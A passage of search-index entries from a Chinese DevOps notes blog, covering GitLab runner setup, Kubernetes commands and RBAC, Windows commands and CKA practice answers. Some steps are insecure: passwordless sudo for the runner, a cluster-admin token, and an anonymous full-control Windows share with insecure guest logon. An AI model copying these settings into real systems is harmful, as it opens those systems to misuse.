gitlab-runner ALL=(ALL) NOPASSWD: ALL docker-runner # 注册 docker run --rm -it -v /srv/gitlab-runner/config:/etc/gitlab-runner gitlab/gitlab-runner register # 启动 docker run -d --name gitlab-runner --restart always \\ -v /root/gitlab-runner/config:/etc/gitlab-runner \\ -v /var/run/docker.sock:/var/run/docker.sock \\ gitlab/gitlab-runner:latest 缓存配置配置 runner 文件 ~/gitlab-runner/config/config.toml 的 runners.cache 部分。 minio 的安装看 minio教程. concurrent = 5 check_interval = 0 shutdown_timeout = 0 [session_server] session_timeout = 1800 [[runners]] name = \"shared\" url = \"https://gitlab.kentxxq.com/\" id = 1 token = \"1\" token_obtained_at = 2024-01-16T07:29:28Z token_expires_at = 0001-01-01T00:00:00Z executor = \"docker\" [runners.cache] # MaxUploadedArchiveSize = 0 Type = \"s3\" Path = \"cicd\" Shared = true [runners.cache.s3] ServerAddress = \"minio-cicd.kentxxq.com\" AccessKey = \"1\" SecretKey = \"2\" BucketName = \"runner\" Insecure = false ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/:2:5","series":null,"tags":["blog","gitlab"],"title":"gitlab教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/#docker-runner"},{"categories":["blog"],"content":" CICD这里只是 CICD 的安装调试，具体使用看 gitlab-cicd教程. Shell-runner前期准备 多机器共享一个 nas, 缓存加速 放置 Maven 或 nodejs 等仓库配置文件 ossutil64 帮助拉取 OSS 上的隐私文件 wget -q http://gosspublic.alicdn.com/ossutil/1.7.9/ossutil64 /opt/ossutil64 安装 docker,并配置 docker镜像源 安装 helm curl https://baltocdn.com/helm/signing.asc | sudo apt-key add - sudo apt-get install apt-transport-https --yes echo \"deb https://baltocdn.com/helm/stable/debian/ all main\" | sudo tee /etc/apt/sources.list.d/helm-stable-debian.list sudo apt-get update sudo apt-get install helm # 验证效果 helm version 安装 kubectl curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\" sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl kubectl version --client 开始安装 curl -LJO \"https://gitlab-runner-downloads.s3.amazonaws.com/latest/deb/gitlab-\"runner_amd64.deb dpkg -i gitlab-runner_amd64.deb usermod -aG docker gitlab-runner 配置 runner root@cicd:~# gitlab-runner register Runtime platform arch=amd64 os=linux pid=18805 revision=8925d9a0 version=14.1.0 Running in system-mode. Enter the GitLab instance URL (for example, https://gitlab.com/): https://git.kentxxq.com/ Enter the registration token: token秘钥 Enter a description for the runner:[cicd]: docker-ci Enter tags for the runner (comma-separated):docker-ciRegistering runner... succeeded runner=3uS9CxxN Enter an executor: parallels, shell, ssh, virtualbox, docker+machine, kubernetes, custom, docker-ssh, docker-ssh+machine, docker:shell Runner registered successfully. Feel free to start it, but if it's running already the config should be automatically reloaded! 修改配置 /etc/gitlab-runner/config.toml, 然后重启 gitlab-runner restart concurrent = 20 check_interval = 0 [session_server] session_timeout = 1800 [[runners]] name = \"runner01\" url = \"https://git.kentxxq.com/\" token = \"token秘钥\" executor = \"shell\" #pre_clone_script = \"sudo chown -R gitlab-runner:gitlab-runner .\" #pre_clone_script = \"sudo chmod -R 777 .\" [runners.custom_build_dir] enabled = true [runners.cache] [runners.cache.s3] [runners.cache.gcs] [runners.cache.azure] 免密 sudo # vim /etc/sudoers加入 gitlab-runner ALL=(ALL) NOPASSWD: ALL docker-runner # 注册 docker run --rm -it -v /srv/gitlab-runner/config:/etc/gitlab-runner gitlab/gitlab-runner register # 启动 docker run -d --name gitlab-runner --restart always \\ -v /root/gitlab-runner/config:/etc/gitlab-runner \\ -v /var/run/docker.sock:/var/run/docker.sock \\ gitlab/gitlab-runner:latest 缓存配置配置 runner 文件 ~/gitlab-runner/config/config.toml 的 runners.cache 部分。 minio 的安装看 minio教程. concurrent = 5 check_interval = 0 shutdown_timeout = 0 [session_server] session_timeout = 1800 [[runners]] name = \"shared\" url = \"https://gitlab.kentxxq.com/\" id = 1 token = \"1\" token_obtained_at = 2024-01-16T07:29:28Z token_expires_at = 0001-01-01T00:00:00Z executor = \"docker\" [runners.cache] # MaxUploadedArchiveSize = 0 Type = \"s3\" Path = \"cicd\" Shared = true [runners.cache.s3] ServerAddress = \"minio-cicd.kentxxq.com\" AccessKey = \"1\" SecretKey = \"2\" BucketName = \"runner\" Insecure = false ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/:2:5","series":null,"tags":["blog","gitlab"],"title":"gitlab教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/#缓存配置"},{"categories":["blog"],"content":" 服务端 git-server-hook通常放在 \u003cGitLab 安装路径\u003e/repositories/\u003c命名空间\u003e/\u003c项目名称\u003e.git/hooks/pre-receive. #!/bin/bash #pre-receive script #set -x #for debugging LG='test_new' validate_ref() { # --- Arguments oldrev=$(git rev-parse $1) newrev=$(git rev-parse $2) refname=\"$3\" echo $oldrev echo $newrev echo $3 commitList=`git rev-list $oldrev..$newrev` # echo $commitList split=($commitList) for s in ${split[@]} do echo \"@@@@@@@\" echo \"$s\" msg=`git cat-file commit $s | sed '1,/^$/d'` echo $msg result1=$(echo $msg|grep \"$LG\") result2=$(echo $3|grep \"$LG\") echo $result1 echo $result2 if [ \"$result1\"x != \"\"x ] \u0026\u0026 [ \"$result2\"x != \"$3\"x ] ;then echo \"!!! include $LG\" exit 1 else echo \"ok\" fi done } fail=\"\" # Allow dual mode: run from the command line just like the update hook, or # if no arguments are given then run as a hook script if [ -n \"$1\" -a -n \"$2\" -a -n \"$3\" ]; then # Output to the terminal in command line mode - if someone wanted to # resend an email; they could redirect the output to sendmail # themselves PAGER= validate_ref $2 $3 $1 else while read oldrev newrev refname do validate_ref $oldrev $newrev $refname done fi if [ -n \"$fail\" ]; then exit $fail fi ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/:2:6","series":null,"tags":["blog","gitlab"],"title":"gitlab教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/#服务端-git-server-hook"},{"categories":["blog"],"content":"记录 [[笔记/point/k8s|k8s]] 的常用命令和配置","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/","series":null,"tags":["blog","k8s"],"title":"k8s常用命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":" 简介记录 k8s 的常用命令 ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:1:0","series":null,"tags":["blog","k8s"],"title":"k8s常用命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#简介"},{"categories":["blog"],"content":" 命令","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:2:0","series":null,"tags":["blog","k8s"],"title":"k8s常用命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#命令"},{"categories":["blog"],"content":" 资源简写kubectl api-resources 可以查看资源简写。常用如下: name alias apiversion namespace lkind namespaces ns v1 false Namespace deployments deploy apps/v1 true Deployment ingresses ing networking.k8s.io/v1 true Ingress configmaps cm v1 true ConfigMap services svc v1 true Service serviceaccounts sa v1 true ServiceAccount nodes no v1 false Node persistentvolumeclaims pvc v1 true PersistentVolumeClaim persistentvolumes pv v1 false PersistentVolume 如果你安装了 lstio 这样有自定义资源的组件，一样也会出现在这里 ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:2:1","series":null,"tags":["blog","k8s"],"title":"k8s常用命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#资源简写"},{"categories":["blog"],"content":" 查询信息 # 获取实时deployment信息 kubectl get --watch deployments # 查询所有ingressClassName kubectl get ingressclasses # 查询具体权限 kubectl describe ClusterRole tzedu:developer ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:2:2","series":null,"tags":["blog","k8s"],"title":"k8s常用命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#查询信息"},{"categories":["blog"],"content":" 日志查询 kubectl logs \u003cpod-name\u003e -c \u003ccontainer-name\u003e # 通过label查询多个容器的日志 kubectl logs -f -n kube-system -l k8s-app=calico-node ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:2:3","series":null,"tags":["blog","k8s"],"title":"k8s常用命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#日志查询"},{"categories":["blog"],"content":" 清理残存容器强制删除 pod, 其他资源同参数也可以删除. kubectl delete pod pod名称 -n 命名空间 --force --grace-period=0 ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:2:4","series":null,"tags":["blog","k8s"],"title":"k8s常用命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#清理残存容器"},{"categories":["blog"],"content":" 创建用户和 token创建这个 yaml 创建用户 admin-user 创建 clusterrolebindding，绑定权限到 cluster-admin（权限很高） apiVersion: v1 kind: ServiceAccount metadata: name: admin-user namespace: kubernetes-dashboard --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: admin-user roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: cluster-admin subjects: - kind: ServiceAccount name: admin-user namespace: kubernetes-dashboard 临时 token： kubectl -n kubernetes-dashboard create token admin-user 长期 token： apiVersion: v1 kind: Secret metadata: name: admin-user namespace: kubernetes-dashboard annotations: kubernetes.io/service-account.name: \"admin-user\" type: kubernetes.io/service-account-token 获取长期 token kubectl get secret admin-user -n kubernetes-dashboard -o jsonpath={\".data.token\"} | base64 -d 文档地址在 这里，来自/适用于 kubernetes/dashboard ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:2:5","series":null,"tags":["blog","k8s"],"title":"k8s常用命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#创建用户和-token"},{"categories":["blog"],"content":" 配置","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:3:0","series":null,"tags":["blog","k8s"],"title":"k8s常用命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#配置"},{"categories":["blog"],"content":" 命令补全加入到 ~/.bashrc 中，然后 source 生效 source \u003c(kubectl completion bash) source \u003c(kubeadm completion bash) ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:3:1","series":null,"tags":["blog","k8s"],"title":"k8s常用命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#命令补全"},{"categories":["blog"],"content":" 应用示例 apiVersion: apps/v1 kind: Deployment metadata: name: nginx-deployment spec: replicas: 1 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx:latest ports: - containerPort: 80 --- apiVersion: v1 kind: Service metadata: name: nginx-service spec: selector: app: nginx ports: - protocol: TCP port: 80 targetPort: 80 --- apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: nginx-ingress spec: ingressClassName: nginx rules: - http: paths: - path: / pathType: Prefix backend: service: name: nginx-service port: number: 80 ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:3:2","series":null,"tags":["blog","k8s"],"title":"k8s常用命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#应用示例"},{"categories":["blog"],"content":" 自定义开发者权限 apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: name: 'msb_developer' rules: - apiGroups: - '' resources: - pods - pods/portforward - pods/proxy verbs: - get - list - watch - create - delete - apiGroups: - '' resources: - pods/attach - pods/exec verbs: - create - get - list - watch - apiGroups: - '' resources: - configmaps - endpoints - persistentvolumeclaims - replicationcontrollers - replicationcontrollers/scale - secrets - serviceaccounts - services - services/proxy verbs: - get - list - watch - apiGroups: - '' resources: - events - namespaces/status - replicationcontrollers/status - pods/log - pods/status - componentstatuses verbs: - get - list - watch - apiGroups: - '' resources: - namespaces verbs: - get - list - watch - apiGroups: - apps resources: - daemonsets - deployments - deployments/rollback - deployments/scale - replicasets - replicasets/scale - statefulsets verbs: - get - list - watch - patch - apiGroups: - autoscaling resources: - horizontalpodautoscalers verbs: - get - list - watch - apiGroups: - batch resources: - cronjobs - jobs verbs: - get - list - watch - apiGroups: - extensions resources: - daemonsets - deployments - deployments/rollback - deployments/scale - ingresses - replicasets - replicasets/scale - replicationcontrollers/scale verbs: - get - list - watch - apiGroups: - networking.k8s.io resources: - '*' verbs: - get - list - watch - apiGroups: - servicecatalog.k8s.io resources: - clusterserviceclasses - clusterserviceplans - clusterservicebrokers - serviceinstances - servicebindings verbs: - get - list - watch - apiGroups: - alicloud.com resources: - '*' verbs: - get - list - watch - apiGroups: - policy resources: - poddisruptionbudgets verbs: - get - list - watch - apiGroups: - networking.istio.io resources: - '*' verbs: - get - list - watch - apiGroups: - config.istio.io resources: - '*' verbs: - get - list - watch - apiGroups: - rbac.istio.io resources: - '*' verbs: - get - list - watch - apiGroups: - istio.alibabacloud.com resources: - '*' verbs: - get - list - watch - apiGroups: - authentication.istio.io resources: - '*' verbs: - get - list - watch - apiGroups: - log.alibabacloud.com resources: - '*' verbs: - get - list - watch - apiGroups: - monitoring.kiali.io resources: - '*' verbs: - get - list - watch - apiGroups: - eventing.knative.dev resources: - '*' verbs: - get - list - watch ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:3:3","series":null,"tags":["blog","k8s"],"title":"k8s常用命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#自定义开发者权限"},{"categories":["blog"],"content":"记录一些 [[笔记/point/windows|windows]] 命令和配置","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/","series":null,"tags":["blog"],"title":"windows命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":" 简介记录一些 windows 命令和配置 ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:1:0","series":null,"tags":["blog"],"title":"windows命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#简介"},{"categories":["blog"],"content":" 命令","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:2:0","series":null,"tags":["blog"],"title":"windows命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#命令"},{"categories":["blog"],"content":" 查看系统信息 msinfo32 # 或者 winver ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:2:1","series":null,"tags":["blog"],"title":"windows命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#查看系统信息"},{"categories":["blog"],"content":" 查找过滤 # 占用13800端口的进程 netstat -aon|findstr \"13800\" # tasklist|findstr \"12884\" # ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:2:2","series":null,"tags":["blog"],"title":"windows命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#查找过滤"},{"categories":["blog"],"content":" 动态端口保留 # 查看动态端口范围 netsh int ipv4 show dynamicport tcp # 被系统或者我们自己保留的端口 netsh int ipv4 show excludedport tcp # 设置动态端口范围 netsh int ipv4 set dynamicport tcp start=49152 num=16384 # 保留 6942~6951 这10个端口给应用程序使用 netsh int ipv4 add excludedportrange protocol=tcp startport=6942 numberofports=10 # 保留 9090 端口给应用程序使用 netsh int ipv4 add excludedportrange protocol=tcp startport=9090 numberofports=1 # 带星号的就是被管理员保留的端口，可以被应用程序使用 # 如果要取消保留端口，可以： netsh int ipv4 delete excludedportrange protocol=tcp startport=9090 numberofports=1 ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:2:3","series":null,"tags":["blog"],"title":"windows命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#动态端口保留"},{"categories":["blog"],"content":" 计算 hash # MD5 Get-FileHash -Algorithm MD5 -Path C:\\Path\\To\\File # SHA256 Get-FileHash -Algorithm SHA256 -Path C:\\Path\\To\\File ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:2:4","series":null,"tags":["blog"],"title":"windows命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#计算-hash"},{"categories":["blog"],"content":" 杀死进程 # 杀死进程 TASKKILL /F /IM tomcat8186.exe ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:2:5","series":null,"tags":["blog"],"title":"windows命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#杀死进程"},{"categories":["blog"],"content":" 删除文件 del /f /s /q \"E:\\Apache\\NginxCluster86\\TomcatNode8186\\logs\\*\" ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:2:6","series":null,"tags":["blog"],"title":"windows命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#删除文件"},{"categories":["blog"],"content":" 间隔时间 # 相当于间隔了20秒 ping 127.0.0.1 -n 20 ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:2:7","series":null,"tags":["blog"],"title":"windows命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#间隔时间"},{"categories":["blog"],"content":" 启动服务 sc start 服务名 ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:2:8","series":null,"tags":["blog"],"title":"windows命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#启动服务"},{"categories":["blog"],"content":" 配置","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:3:0","series":null,"tags":["blog"],"title":"windows命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#配置"},{"categories":["blog"],"content":" 多用户远程桌面 打开 gpedit.msc 计算机配置 =\u003e 管理模板 =\u003e windows组件 =\u003e 远程桌面服务 =\u003e 远程桌面会话主机 =\u003e 连接 配合 限制连接的数量, 启用 并配置 个数. 关闭某个会话 进入到 任务管理器 =\u003e 打开 用户面板 =\u003e 断开会话,关闭会话 ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:3:1","series":null,"tags":["blog"],"title":"windows命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#多用户远程桌面"},{"categories":["blog"],"content":" 共享文件夹 启用 smb 文件夹右键共享 添加 everyone，ay 匿名的所有控制权限 启用所有网络发现，关闭密码 处理问题: win10 无法访问, 而 win7 可以. 打开 gpedit.msc 计算机配置 =\u003e 管理模板 =\u003e 网络 =\u003e Lanman 工作站 配置 启用不安全的来宾登录 为 启用 ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/:3:2","series":null,"tags":["blog"],"title":"windows命令和配置","uri":"/posts/%E7%AC%94%E8%AE%B0/windows%E5%91%BD%E4%BB%A4%E5%92%8C%E9%85%8D%E7%BD%AE/#共享文件夹"},{"categories":["journal"],"content":"2023-08-14 日记","date":"2023-08-14","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-14/","series":null,"tags":["journal"],"title":"2023-08-14","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-14/"},{"categories":["journal"],"content":"#lines 记录下陈皓的文章, 因为觉得写的很好, 帮助很大. 而他已经离开人世了, 担心后面可能不会再访问, 所以备份下来. 谈谈我的“三观” _ 酷 壳 - CoolShell (2023_8_14 10_15_43) ","date":"2023-08-14","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-14/:0:0","series":null,"tags":["journal"],"title":"2023-08-14","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-14/#"},{"categories":["point"],"content":"archery 是一个 sql 审计工具. 要点: 开源 免费 对接 LDAP: AUTH_LDAP_SERVER_URI = \"ldap://ldap.kentxxq.com\" AUTH_LDAP_BING_DN = \"cn=ldap,CN=Users,ou=Ken,dc=kentxxq,dc=com\" AUTH_LDAP_BING_PASSWORD = '密码' AUTH_LDAP_CONNECTION_OPTIONS = { ldap.OPT_DEBUG_LEVEL: 1, ldap.OPT_REFERRALS: 0, } AUTH_LDAP_USER_SEARCH = LDAPSearch( 'ou=Ken,dc=kentxxq,dc=com', ldap.SCOPE_SUBTREE, '(cn=%(user)s)' ) ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/archery/:0:0","series":null,"tags":["point","archery"],"title":"archery","uri":"/posts/%E7%AC%94%E8%AE%B0/point/archery/#"},{"categories":["blog"],"content":"CKA 是 [[笔记/point/k8s|k8s]] 的一个管理员认证, 我也弄了一个证书 [[附件/CKA证书.pdf|CKA证书]]","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/"},{"categories":["blog"],"content":" 简介CKA 是 k8s 的一个管理员认证, 我也弄了一个证书 CKA证书. ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:1:0","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#简介"},{"categories":["blog"],"content":" 考试题","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:2:0","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#考试题"},{"categories":["blog"],"content":" 扩容将名为 my-nginx 的 deployment 的数量，扩展至 10 个 pods. 环境准备: kubectl create deployment my-nginx --image=nginx 答题: kubectl scale deployment my-nginx --replicas=10 ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:2:1","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#扩容"},{"categories":["blog"],"content":" 多容器创建一个多容器的 Pod 对象 nginx 容器用 nginx 镜像 redis 容器用 redis 镜像 tomcat 容器用 tomcat 镜像 mysql 容器用 mysql 答题: apiVersion: v1 kind: Pod metadata: name: multi spec: containers: - name: nginx image: nginx - name: redis image: redis - name: tomcat image: tomcat - name: mysql image: mysql:5.7 env: - name: MYSQL_ROOT_PASSWORD value: \"mima\" ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:2:2","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#多容器"},{"categories":["blog"],"content":" 添加容器端口, 通过 service 暴露服务 # images下加上ports相关内容 containers: - image: nginx imagePullPolicy: Always name: nginx ports: - name: http protocol: TCP containerPort: 80 暴露端口 80 kubectl expose deployment front-end --name=front-end-svc --port=80 --target-port=80 --type=NodePort ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:2:3","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#添加容器端口-通过-service-暴露服务"},{"categories":["blog"],"content":" pod 添加 sidecar题目: sidecar 使用 busybox，添加到 pod legacy-app 中 新 sidecar 运行 /bin/sh -c tail -n+1 -f /var/log/legacy-app.log 使用安装在/var/log 的卷，使日志 legacy-app.log 可用于 sidecar 的容器 答题: 将 pod 导出成 yml 保存到文件中 kubectl get pod legacy-app -o yaml \u003e 1.yml 编辑文件 vim 1.yml apiVersion: v1 kind: Pod metadata: name: legacy-app spec: containers: - name: count image: busybox args: - /bin/sh - -c - \u003e i=0; while true; do echo \"$i: $(date)\" \u003e\u003e /var/log/legacy-app.log; sleep 1; done volumeMounts: - name: varlog mountPath: /var/log - name: sidecar image: busybox args: [/bin/sh, -c, 'tail -n+1 -f /var/log/legacy-app.log'] volumeMounts: - name: varlog mountPath: /var/log volumes: # volumes 块在导出的 yaml 下面已经有了，在已有的添加下面两行即可 - name: varlog emptyDir: {} kubectl apply -f 1.yml 应用改动. 如果失败则先 